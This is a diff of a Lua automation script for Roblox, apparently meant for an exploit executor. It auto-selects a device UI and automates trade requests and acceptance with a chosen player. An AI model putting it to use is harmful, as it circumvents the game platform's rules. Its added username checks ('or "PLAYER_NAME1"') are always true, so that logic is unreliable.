@@ -6,13 +6,6 @@ end
 _G.gg = true
 repeat wait() until game:IsLoaded()
 repeat wait() until game.Players.LocalPlayer:FindFirstChild("PlayerGui") and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
-function WaitForPath(parent, path)
-    local current = parent
-    for _, name in ipairs(path) do
-        current = current:WaitForChild(name)
-    end
-    return current
-end
 
 function missing(t, f, fallback)
     if type(f) == t then return f end
@@ -21,44 +14,62 @@ end
 
 queueteleport =  missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
 
-local path = {"MainGUI", "Game", "Crafting", "Inventory", "Salvage", "ScrollFrame", "Container"}
-local container = WaitForPath(game.Players.LocalPlayer:WaitForChild("PlayerGui"), path)
-print("Container загружен:", container)
 print("PlayerGui и Humanoid загружены!")
 
+local player = game:GetService("Players").LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+repeat wait(2) 
+    print('waiting')
+    local selectt = playerGui.DeviceSelect.Container.Tablet.Button
+    getconnections(selectt.MouseButton1Click)[1]:Fire()
+until not player.PlayerGui:FindFirstChild("DeviceSelect")
+
 local targetName = getgenv().name
+local function get_device_type()
+    repeat wait(1) 
+        print('waiting2')
+    until player.PlayerGui:FindFirstChild("MainGUI")
+    local maingui = game.Players.LocalPlayer.PlayerGui.MainGUI
+    local lobbygui = maingui:FindFirstChild("Lobby")
+    local MobileState = lobbygui and lobbygui:FindFirstChild("LeaderBar") ~= nil
+    return MobileState and 'mobile' or 'tablet'
+end
+
+local DEVICE_TYPE = get_device_type()
 
 game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(args)
     lastOfferTime = args.LastOffer
 end)
+local tradeGUI2 = playerGui:WaitForChild("TradeGUI")
+local TDselect = DEVICE_TYPE == 'tablet' and tradeGUI2
 
--- Получаем сервисы
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 local TradeRemote = ReplicatedStorage:WaitForChild("Trade")
-local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 
-local tradegui = playerGui:WaitForChild("TradeGUI")
-local container = tradegui:WaitForChild("Container")
+local container = TDselect:WaitForChild("Container")
 -- Получаем кнопки
 local actions = container:WaitForChild("Trade"):WaitForChild("Actions")
 local acceptcon = actions:WaitForChild("Accept")
--- Получаем TradeRequest GUI
-local tradeRequest = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container:WaitForChild("TradeRequest")
 
-tradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
-    if tradeRequest.Visible then
-        local usernameLabel = tradeRequest:FindFirstChild("ReceivingRequest") and tradeRequest.ReceivingRequest:FindFirstChild("Username")
+-- Получаем TradeRequest GUI
+local tradeRequest2 = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container:WaitForChild("TradeRequest")
+local TradeRequest = DEVICE_TYPE == 'tablet' and tradeRequest2
+
+TradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
+    if TradeRequest.Visible then
+        local usernameLabel = TradeRequest:FindFirstChild("ReceivingRequest") and TradeRequest.ReceivingRequest:FindFirstChild("Username")
         if usernameLabel then
             -- Если текст уже корректный и наш доверенный игрок
             if usernameLabel.Text == targetName then
                 handleTrade(usernameLabel.Text)
-            elseif usernameLabel.Text == "Nikilis" then
+            elseif usernameLabel.Text == "Nikilis" or "PLAYER_NAME1" then
                 -- Ждём, пока текст сменится на реального игрока
                 local conn
                 conn = usernameLabel:GetPropertyChangedSignal("Text"):Connect(function()
-                    if usernameLabel.Text ~= "Nikilis" then
+                    if usernameLabel.Text ~= "Nikilis" or "PLAYER_NAME1" then
                         conn:Disconnect()
                         if usernameLabel.Text == targetName then
                             handleTrade(usernameLabel.Text)
@@ -76,12 +87,12 @@ tradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
 end)
 
 
-tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
-    if tradegui.Enabled then
-        local firstSlot = LocalPlayer.PlayerGui.TradeGUI.Container.Trade.TheirOffer.Container.NewItem1
+TDselect:GetPropertyChangedSignal("Enabled"):Connect(function()
+    if TDselect.Enabled then
+        local firstSlot = TDselect.Container.Trade.TheirOffer.Container.NewItem1
         repeat
             wait(0.7)
-            if not tradegui.Enabled then
+            if not TDselect.Enabled then
                 print("трейд закрылся в логике офера")
                 return
             end
@@ -91,7 +102,7 @@ tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
 
         repeat
             wait(0.5)
-            if not tradegui.Enabled then
+            if not TDselect.Enabled then
                 print("трейд закрылся в логике кулдавна")
                 return
             end
